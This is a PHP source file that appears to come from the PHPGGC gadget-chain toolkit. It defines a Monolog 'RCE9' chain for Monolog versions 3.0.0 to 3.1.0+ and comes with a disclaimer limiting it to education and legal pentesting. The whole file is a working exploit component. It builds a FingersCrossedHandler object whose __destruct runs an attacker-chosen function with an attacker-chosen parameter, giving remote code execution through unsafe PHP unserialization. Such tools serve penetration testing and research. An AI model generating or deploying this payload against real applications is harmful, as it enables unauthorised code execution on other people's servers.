<?php

namespace GadgetChain\Monolog;

class RCE9 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.0.0 <= 3.1.0+';
    public static $vector = '__destruct';
    public static $author = 'mir-hossein (Mirhossein Rahmani)';
    public static $information = 'Please use this exploit only for educational purposes or legal pentest, Thank you!';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\FingersCrossedHandler($function, $parameter);
    }
}